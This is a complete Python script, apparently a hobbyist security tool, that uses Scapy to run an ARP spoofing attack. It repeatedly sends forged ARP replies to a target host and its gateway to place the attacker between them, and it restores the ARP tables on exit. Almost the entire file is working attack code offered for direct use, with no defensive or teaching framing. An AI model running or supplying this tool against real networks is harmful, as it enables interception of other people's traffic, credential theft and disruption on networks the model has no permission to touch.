#!/usr/bin/env python3
# arp_spoof.py
"""ARP Spoofing using Python3 and ScaPy"""

import sys
import time
import argparse
try:
    import scapy.all as sp
except ModuleNotFoundError:
    print('Please install the dependencies: ScaPy')
    print('Run: sudo python3 -m pip install scapy[complete]')
    sys.exit(0)


def set_arguments(p):
    # Setting options for command line arguments
    p.add_argument('-t', '--target', dest='target_ip', help='Provide a Target IP Address (IPv4)')
    p.add_argument('-s', '--spoof', dest='spoof_ip', help='Provide a Spoof IP Address, generally the gateway IP (IPv4)')


def get_arguments(p):
    # Parsing the command line arguments and returning the arguments
    arguments = p.parse_args()
    if arguments.target_ip is None:
        p.error(f'Please specify a target IP. Type {sys.argv[0]} -h for more info.')
    elif arguments.spoof_ip is None:
        p.error(f'Please specify a spoof IP. Type {sys.argv[0]} -h for more info.')
    else:
        return arguments


def scan_ip(ip):
    # Creating an ARP request packet
    arp_req = sp.ARP(pdst=ip)
    # Creating a broadcast channel packet
    broadcast = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
    # Linking the ARP request packet to the broadcast
    arp_req_broad = broadcast / arp_req
    # Sending the combined custom packet with a timeout of 1 second and accepting the response packets
    # (returns a list of two objects: answered and unaswered packets)
    answered, _ = sp.srp(arp_req_broad, timeout=1, verbose=False)
    # Extracting the IP and MAC Address from the answered packets
    client = {'ip': answered[0][1].psrc, 'mac': answered[0][1].hwsrc}
    return client


def spoof(target_ip, spoof_ip):
    # Getting the MAC Address of the target IP
    target_mac = scan_ip(target_ip).get('mac')
    # Creating an ARP response packet with destination IP as target IP,
    # destination MAC as target MAC and source IP as the gateway IP
    target_pkt = sp.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sp.send(target_pkt, verbose=False)  # Sending the packet


def restore(dst_ip, src_ip):
    # Function to restore the ARP Tables by sending the true packets
    dst_mac = scan_ip(dst_ip).get('mac')
    src_mac = scan_ip(src_ip).get('mac')
    rst_pkt = sp.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    sp.send(rst_pkt, verbose=False, count=4)


if __name__ == '__main__':
    pktcount = 0
    parser = argparse.ArgumentParser()  # ArgumentParser() class to parse the command line arguments
    set_arguments(parser)
    # Getting the command line arguments
    args = get_arguments(parser)
    try:
        while(True):
            spoof(args.target_ip, args.spoof_ip)
            spoof(args.spoof_ip, args.target_ip)
            pktcount += 2
            print(f'\r[+] Packets Sent: {pktcount}', end='')  # \r to print from the starting of the current line
            time.sleep(2)

    except PermissionError:
        print('[!] Please run the script as root.')

    except KeyboardInterrupt:
        restore(args.target_ip, args.spoof_ip)
        restore(args.spoof_ip, args.target_ip)
        print('\n[+] Restored ARP Tables... Exiting.')
